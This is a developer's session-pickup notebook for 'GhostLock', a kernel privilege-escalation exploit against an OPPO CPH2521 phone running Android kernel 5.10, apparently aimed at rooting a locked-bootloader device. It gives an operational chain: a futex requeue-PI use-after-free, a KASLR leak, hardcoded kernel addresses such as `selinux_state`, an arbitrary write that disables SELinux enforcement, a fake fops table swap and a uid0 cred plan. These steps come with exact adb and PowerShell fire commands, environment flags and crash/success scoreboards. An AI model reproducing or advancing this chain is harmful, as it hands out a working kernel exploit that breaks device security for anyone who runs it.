# Next session pickup — CPH2521 GhostLock

**When:** after **Z14 BSS-lock park ALIVE** (2026-08-23).  
**Workspace:** `C:\Users\LENOVO\Desktop\HILY installer\Oppo\ghostlock-oneplus`  
**Branch:** `research-master`  
**Policy:** stay on `research-master`. WiFi ADB `192.168.1.108:5555` (Shizuku). USB OK to fire/classify. After softboot, force-stop Shizuku if 5555 is dead. **Do not second GhostLock process on a park boot (Z5).**

**Read first:** this file, then `docs/Z4_SELINUX_PARK_2026-08-23.md`.

---

## Z14 freeze (logged) — 8-byte NULL into `selinux_state`

Park at ~40s lived. At **42.4s** dmesg: `before initial load_policy on unknown SID`. At **140s** `getpeercon() failed` → `OplusCfThread` SIGKILL `system_server` + zygote. Kernel+adbd stayed. Screen off. Logs: `logs/aarif_pull/Z14_freeze/`.

`0x02A793C8` is **`&selinux_state`**, not a lone int. Leaf NULL stores 8 zeros: `initialized` (byte 3) dies. That is the delayed UI death, not a panic.

**Z15 PLAIN-STORE park ALIVE and stayed up** (WiFi, boot `4a50ba6c-…`): `pselect ret=5`, `enforce=0`, **`id` still `u:r:shell:s0`**, zygote+system_server alive **>2 min** (Z14 died at +100s). Cred skipped: post-park spray did not set `g_cred_copy` because `pselect_custom_write` was cleared — **fixed in 190928** (`MODE4_UID0` always fills copy).

**Next fire (fresh boot, one process):** same PLAIN-STORE park + UID0. Expect `cred_copy=ffffff80…` then W2. Do not second-process this Z15 boot.

---

## First fire was Z14 — already done. Next is cred-on-park in one process

Z4/Z6 park **ALIVE** with spray `ffffff80 3955 0000` and `pselect ret=4`.  
Z8 miss ALIVE `ret=0`.  
**Z9–Z13** all died at **`pselect pre-select +2ms`** on P0 spray pages (`ffffff80 48xx/51xx/65xx/47xx`). Same leaf geometry. Cred never ran.

**Theory:** skb reclaim often misses (`PACKET_RING errno=13`). Overlay `lock=task=sprayed page` then walks garbage → KP entering select. Living parks were the reclaim-hit lottery.

**Fix in current `ghostlock-cph2521` (190480 bytes):** SLIDE_ZERO **skips spray**. Stack `task=P0(init_task)` `lock=P0(init_task+0x878)` (`pi_waiters` empty, `pi_top` NULL). Leaf still `parent=selinux-8` red, `left=right=0`.

WiFi, unix-LF runner (not `fire_mode.ps1` CRLF):

```powershell
$ADB = "$env:LOCALAPPDATA\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
$S = "192.168.1.108:5555"
& $ADB connect $S
# push ghostlock-cph2521 → /data/local/tmp/gl_uid0
# env: MODE4_ONLY=1 MODE4_SLIDE_ZERO=1 DATAONLY_TARGET=0x2a793c8 MODE4_SWAP_NOCFI=1 MODE4_UID0=1
```

Success: `enforce_after=0`, `SLIDE_ZERO spray skipped`, place `task=ffffff802a40cf00` `lock=ffffff802a40d778`, **ALIVE**. Then same-process diag; cred only if P0 DRAM task leak (skip if `ffffff87…`).  
Stop: punch SOFTBOOT at pre-select again.

---

## Scoreboard (uid0 attempt)

| Tag | Page / overlay | pselect | Result |
|-----|----------------|---------|--------|
| **Z4/Z6** | spray `ffffff8039550000` | **ret=4** | Park ALIVE `enforce=0` |
| Z6 cred | leak `ffffff87cd015c80` + `init_cred` as rb parent | — | UI freeze (zygote dead, SID/load_policy) |
| Z5 | second process on park boot | requeue | KP |
| Z8 | spray `ffffff8022210000` | ret=0 | miss ALIVE |
| **Z9–Z13** | spray `ffffff80…` fake_lock/task | **pre-select +2ms** | punch SOFTBOOT |
| Z7 | `ffffff87…` high alias | pre-select | punch SOFTBOOT |

Do **not** second GhostLock process on a park boot. Do **not** open swapped ashmem. Do **not** USB-thrash.

---

## Device / ADB

| | |
|--|--|
| Device | OPPO Reno 10 Pro+ CPH2521 / OP56D3L1 |
| Kernel | `5.10.236-android12-9-o-g74d132f4467a` locked BL |
| ADB | `192.168.1.108:5555` Shizuku |
| Host adb | WinGet `platform-tools\adb.exe` only — **not** Desktop `platform-tools` |
| Last seen | after **Z5** (second walk on park boot) true SOFTBOOT |
| Breakthrough | **Z4:** `enforce_after=0` `CLASS=ALIVE` `getenforce=Permissive` uid still 2000 |
| Truth | live_sync + shell. Oracle UUID rewrite ≠ reboot. Z4 `write_proof_miss` is a **false negative** (`landed` keyed on boot_id; trust `enf_wrote=1`). |
| pstore/dmesg | denied under enforcing; **readable after Z4 park** |

**Do not** use `fire_zio_seq.ps1` as a loop. Single-pass `fire_mode.ps1` only. Cool before multi-fire.

---

## Do not re-open

- ION / ZERO_NAME / ZERO_OWNER / PAD3 / dual-PI / MISC-only-left heap geometry
- “blocked by kCFI” — **false.** JoinChang #31 + QEMU: real kCFI **panics**. `errno=22` = vfs/configfs **EINVAL** (swap miss, empty `.write` → no `FMODE_CAN_WRITE`, or bad blob). QEMU forced swap: **kwrite copied 35 bytes**.
- KPHYS unknown — **false.** `0xa8000000` (Nothing Phone 2 SM8475 `/proc/iomem` + boot_id P0 proof). `delta=0x28000000`.
- KASLR slide=0 — **false.** `MODE4_SLIDE=1` leaks it.
- JoinChang 6.12 `.write_iter` table on 5.10 — **panic.** 5.10 configfs bin is `.read`/`.write` (+0x10/+0x18).
- `CONFIG_STATIC_USERMODEHELPER=y` (empty path) — **no** modprobe_path / core_pattern UMH. Pipe/cred after kwrite.
- Opening `/dev/ashmem` via shell `exec 3<>` is `O_CREAT` and lies. Use the binary `open()`.
- `MODE4_ROOT=1` this cycle died at **oracle punch** (R1). Prefer two fires: oracle then swap. Fresh futex words already in tree (`56dbe98`).

---

## Proven this lab (keep)

| Fact | Evidence |
|------|----------|
| UAF prime | `CMP_REQUEUE_PI errno=35` reliable |
| Data AAW | boot_id write-proof (quiet BSS) |
| **KASLR leak** | `MODE4_SLIDE=1` → `boot_id` ctl_table.data = `nfulnl_logger`. Decode: `python tools\slide_decode.py <uuid>` |
| Oracle reliability | **O19 O20 O21 O22 LANDED.** `fire_mode` CLASS=SOFTBOOT is the synthetic UUID. |
| Stack swap geometry | `MODE4_SLIDE_SWAP`: `tree_pc=fake_fops`, `tree_l=P0(ashmem_misc+0x10)` |
| Swap can classify ALIVE | **N5** (GLM) and **N7** (this cycle) `MODE4_SWAP_NOCFI=1` same UUID through classify |
| Swap **does land** | N7 ALIVE → **delayed true SOFTBOOT** after GhostLock **exits** (SKB page freed, `*MISC.fops` dangling). That is the product constraint. |
| Table | clone ashmem + **only `.write` armed**; owner=0; 5.10 `.read` NULL so system `read()` uses real `read_iter` |
| QEMU | kCFI OK with real `.cfi_jt`; configfs write **35 bytes** when table is really swapped |

---

## This cycle scoreboard (2026-08-23 evening)

| Tag | Env | Result |
|-----|-----|--------|
| **N7** | SWAP_NOCFI on live O20 `slide=0x2be6000000` | **ALIVE** classify, stamp printed. Then **delayed true SOFTBOOT** after process exit. |
| **R1** | `MODE4_ROOT=1` | true SOFTBOOT at **oracle punch** |
| **O21** | `MODE4_SLIDE=1` | LANDED `661fa738-e4ff-ffff-…` → slide `0x242ea00000` |
| **N8** | SLIDE_SWAP **with** try_cfi (no NOCFI) | true SOFTBOOT at **swap punch** (never opened) |
| **O22** | `MODE4_SLIDE=1` | LANDED `661f27f6-e0ff-ffff-…` → slide `0x20ec200000` |
| **N9** | SWAP_NOCFI + **SWAP_HOLD** (new binary) | true SOFTBOOT at **consumer punch** — hold **never reached** |

Swap punch with `parent=fake_fops` is **~50/50** (N5/N7 live vs N6/N8/N9 die). Oracle punch is the reliable one. If punch dies, **stop** — do not hammer.

---

## Uncommitted (must ship in the next binary fire)

Committed tip `9a20ebb` does **not** include HOLD. Working tree:

```
M  src/core/fops.c          MODE4_SWAP_HOLD sleep after NOCFI (spray fds stay open)
M  src/core/main.c          same in do_one_write
M  grok_context.md
M  ghostlock-cph2521        183416 bytes, built 2026-08-23 18:45 — HAS HOLD
?? tools/swap_probe.c       KIMAGE fixed to 0xffffffc008000000
?? swap_probe               9648 bytes aarch64
?? docs/GLM_HANDOFF_PICKUP_2026-08-23.md
?? docs/NEXT_SESSION_2026-08-23.md  (this file)
```

Confirm before fire: binary date/size **183416**, and strings/`MODE4_SWAP_HOLD` path. If you rebuild, `.\build_cph2521.ps1` (NDK `android-ndk-r27d`).

`fire_mode.ps1` **hangs** if HOLD sleeps in the foreground `adb shell`. For N-class HOLD, **do not** use stock `fire_mode` as the waiter. Background the device process (see below).

---

## First fire next session (uid0)

Prefer uptime ≲ 90s. **Do not** open swapped ashmem. **Do not** second-walk on a live park.

1. Reproduce park (optional if already trusted):
   ```powershell
   .\fire_mode.ps1 -ModeEnv "MODE4_SLIDE_ZERO=1 DATAONLY_TARGET=0x2a793c8 MODE4_SWAP_NOCFI=1" -TagPrefix "Z"
   ```
   Success: `enforce_after=0` + ALIVE. Then **stop that boot**.
2. Fresh boot: cred walk (JoinChang mode=2 / `init_cred` child). One punch.
3. Heap `W0.pi` must stay inert `(1,0,0)` for ZERO. Stack leaf `parent=target-8`.

## Stale path (do not use as first fire)

Prefer uptime ≲ 90s. One oracle, one swap. Then **stop** if punch SOFTBOOTS. **Blocked:** N11/N12 die at `cfi_before_open`. Use only after cred/park is solved.

### 1) Oracle

```powershell
.\fire_mode.ps1 -ModeEnv "MODE4_SLIDE=1" -TagPrefix "O23"
```

Ignore CLASS=SOFTBOOT if live_sync `write_proof_LANDED` and UUID looks like `661f****-**ff-ffff-e0a8-8d2a80ffffff`.

```powershell
python tools\slide_decode.py <boot_after>
```

### 2) Swap + hold (spray must not exit)

Push current `ghostlock-cph2521` + `swap_probe`. Runner env:

```
MODE4_ONLY=1
MODE4_SLIDE_SWAP=1
KASLR_SLIDE=0x<decoded>
MODE4_SWAP_NOCFI=1
MODE4_SWAP_HOLD=1
GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log
```

Launch so GhostLock **stays running** on device (host `adb shell` may drop; process must not). Poll live_sync for `swap_hold` and console line:

`SWAP_HOLD: spray live fake_fops=... pid=...`

If punch SOFTBOOTS (live_sync stops at `waiter_after_requeue_enter_pselect`, new **random** UUID, low uptime): **stop**, cool, do not immediately re-fire.

### 3) If `swap_hold` printed — immediately, same boot

```powershell
adb -s 192.168.1.108:5555 shell /data/local/tmp/swap_probe 0x<fake_fops> 0x<slide> nomodprobe
```

Success = `W1 ret=8` / `*** ARBITRARY WRITE LIVE ***`.  
**Do not** pass `modprobe` (`STATIC_USERMODEHELPER`). If W1 lives: llseek repair is inside swap_probe; then in-tree pipe/cred (`try_cfi_stage` / existing path), still **without** killing the holder process.

---

## Issue #31 (JoinChang) — for replies / context only

https://github.com/JoinChang/ghostlock-oneplus/issues/31

Owner (Aug 21): device feasible; compact waiter; **errno=22 is not kCFI**; KPHYS default `0xa8000000`.  
Our follow-ups (KASLR? CFI? data-only?) **unanswered**.  
Do not ask “how to bypass kCFI”. Draft follow-up already matches lab (slide leaked, SWAP_NOCFI ALIVE + delayed death, STATIC_UMH, 5.10 `.write` not `_iter`). **Do not post unless the user asks.**

---

## Env cheat sheet (current path only)

| Env | Use |
|-----|-----|
| `MODE4_SLIDE=1` | KASLR oracle |
| `MODE4_SLIDE_SWAP=1` `KASLR_SLIDE=0x…` | `*MISC.fops = fake_fops` |
| `MODE4_SWAP_NOCFI=1` | skip `try_cfi_stage` / ashmem open |
| `MODE4_SWAP_HOLD=1` | sleep after NOCFI; **required** so SKB page stays |

`fire_mode.ps1` always sets `MODE4_ONLY=1`.

---

## Success / stop

- **Breakthrough (then git ok):** kwrite copies N bytes on device, or uid0.  
- **Stop:** phone hot; two punch-SOFTBOOTs in a row; anything that reintroduces reboot loops.  
- **Not a breakthrough:** another N5-style ALIVE classify that exits and dies later.
